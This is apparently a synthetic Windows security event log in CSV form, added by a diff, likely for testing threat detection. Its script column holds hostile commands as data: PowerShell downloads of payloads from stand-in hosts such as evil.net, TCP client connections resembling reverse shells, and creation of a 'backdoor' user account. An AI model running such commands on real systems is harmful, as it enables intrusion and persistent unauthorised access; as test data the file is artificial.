@@ -1,0 +1,39 @@
+EventID,SystemTime,TargetUserName,IpAddress,WorkstationName,ProcessName,EventDescription,ScriptContent,SourcePort,DestinationPort
+4624,2025-05-21T08:00:00.123456,Admin,127.0.0.1,SRV05,-,Successful Logon (Local),-,-,-
+4625,2025-05-21T08:01:00.234567,Admin,192.168.1.104,ATTACKER-WK08,-,Failed Logon Attempt (Invalid Password),-,-,-
+4625,2025-05-21T08:01:01.345678,Admin,192.168.1.104,ATTACKER-WK08,-,Failed Logon Attempt (Invalid Password),-,-,-
+4104,2025-05-21T08:02:00.456789,User9,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://malicious.net/payload1.ps1 -OutFile C:\Temp\payload1.ps1,-,-,
+5156,2025-05-21T08:03:00.567890,-,192.168.1.205,BOTNET-PC06,-,Network Connection (Potential DDoS),-,54331,80
+5156,2025-05-21T08:03:01.678901,-,192.168.1.205,BOTNET-PC06,-,Network Connection (Potential DDoS),-,54332,80
+5156,2025-05-21T08:03:02.789012,-,192.168.1.205,BOTNET-PC06,-,Network Connection (Potential DDoS),-,54333,80
+4625,2025-05-21T08:04:00.890123,Guest,172.16.0.80,REMOTE-PC04,-,Failed Logon Attempt (Account Disabled),-,-,-
+4104,2025-05-21T08:05:00.901234,User9,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.4', 6666),-,-,
+1,2025-05-21T08:06:00.012345,User9,-,SRV05,C:\Windows\System32\cmd.exe,Sysmon Process Create,C:\Windows\System32\cmd.exe /c net user backdoor /add,-,-
+5156,2025-05-21T08:07:00.123456,-,192.168.1.206,BOTNET-PC07,-,Network Connection (Potential DDoS),-,54334,80
+4104,2025-05-21T08:08:00.234567,User10,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {whoami} -ComputerName SRV06,-,-,
+4625,2025-05-21T08:09:00.345678,TestUser,203.0.113.40,ATTACKER-WK09,-,Failed Logon Attempt (Invalid Username),-,-,-
+5156,2025-05-21T08:10:00.456789,-,192.168.1.206,BOTNET-PC07,-,Network Connection (Potential DDoS),-,54335,80
+4104,2025-05-21T08:11:00.567890,User10,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://evil.net/backdoor2.ps1 -OutFile C:\Temp\backdoor2.ps1,-,-,
+5156,2025-05-21T08:12:00.678901,-,192.168.1.207,BOTNET-PC08,-,Network Connection (Potential DDoS),-,54336,80
+5156,2025-05-21T08:12:01.789012,-,192.168.1.207,BOTNET-PC08,-,Network Connection (Potential DDoS),-,54337,80
+4625,2025-05-21T08:13:00.890123,Admin,192.168.1.104,ATTACKER-WK08,-,Failed Logon Attempt (Invalid Password),-,-,-
+4104,2025-05-21T08:14:00.901234,User9,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.5', 7777),-,-,
+5156,2025-05-21T08:15:00.012345,-,192.168.1.208,BOTNET-PC09,-,Network Connection (Potential DDoS),-,54338,80
+4625,2025-05-21T08:16:00.123456,Guest,172.16.0.80,REMOTE-PC04,-,Failed Logon Attempt (Account Disabled),-,-,-
+4104,2025-05-21T08:17:00.234567,User10,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://malware.net/payload3.ps1 -OutFile C:\Temp\payload3.ps1,-,-,
+1,2025-05-21T08:18:00.345678,User10,-,SRV05,C:\Windows\System32\net.exe,Sysmon Process Create,C:\Windows\System32\net.exe start malicious_service,-,-
+5156,2025-05-21T08:19:00.456789,-,192.168.1.208,BOTNET-PC09,-,Network Connection (Potential DDoS),-,54339,80
+4625,2025-05-21T08:20:00.567890,TestUser,203.0.113.40,ATTACKER-WK09,-,Failed Logon Attempt (Invalid Username),-,-,-
+4104,2025-05-21T08:21:00.678901,User9,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {Get-Process} -ComputerName SRV07,-,-,
+5156,2025-05-21T08:22:00.789012,-,192.168.1.209,BOTNET-PC10,-,Network Connection (Potential DDoS),-,54340,80
+5156,2025-05-21T08:22:01.890123,-,192.168.1.209,BOTNET-PC10,-,Network Connection (Potential DDoS),-,54341,80
+4625,2025-05-21T08:23:00.901234,Admin,192.168.1.104,ATTACKER-WK08,-,Failed Logon Attempt (Invalid Password),-,-,-
+4104,2025-05-21T08:24:00.012345,User10,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://evil.net/backdoor4.ps1 -OutFile C:\Temp\backdoor4.ps1,-,-,
+5156,2025-05-21T08:25:00.123456,-,192.168.1.210,BOTNET-PC11,-,Network Connection (Potential DDoS),-,54342,80
+4625,2025-05-21T08:26:00.234567,Guest,172.16.0.80,REMOTE-PC04,-,Failed Logon Attempt (Account Disabled),-,-,-
+4104,2025-05-21T08:27:00.345678,User9,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.6', 8888),-,-,
+5156,2025-05-21T08:28:00.456789,-,192.168.1.210,BOTNET-PC11,-,Network Connection (Potential DDoS),-,54343,80
+5156,2025-05-21T08:28:01.567890,-,192.168.1.210,BOTNET-PC11,-,Network Connection (Potential DDoS),-,54344,80
+4625,2025-05-21T08:29:00.678901,Admin,192.168.1.104,ATTACKER-WK08,-,Failed Logon Attempt (Invalid Password),-,-,-
+4104,2025-05-21T08:30:00.789012,User10,-,SRV05,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://malware.net/payload5.ps1 -OutFile C:\Temp\payload5.ps1,-,-,
+5156,2025-05-21T08:31:00.890123,-,192.168.1.211,BOTNET-PC12,-,Network Connection (Potential DDoS),-,54345,80
